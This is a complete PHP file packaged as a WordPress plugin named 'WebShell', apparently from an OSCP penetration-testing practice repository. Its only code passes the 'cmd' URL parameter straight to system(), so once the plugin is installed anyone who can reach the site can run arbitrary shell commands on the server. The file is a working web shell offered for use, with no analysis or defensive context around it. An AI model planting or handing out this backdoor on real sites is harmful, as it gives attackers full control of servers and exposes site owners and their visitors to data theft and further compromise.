<?php
/**
* Plugin Name: WebShell
* Plugin URI: https://github.com/Akasaru0/OSCP/blob/main/wordpress_plugin.php
* Description: Wordpress webshell 
* Version: 1.0
* Author: akasaru0
* Author URI: https://github.com/Akasaru0/
* License: https://nosuchlicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
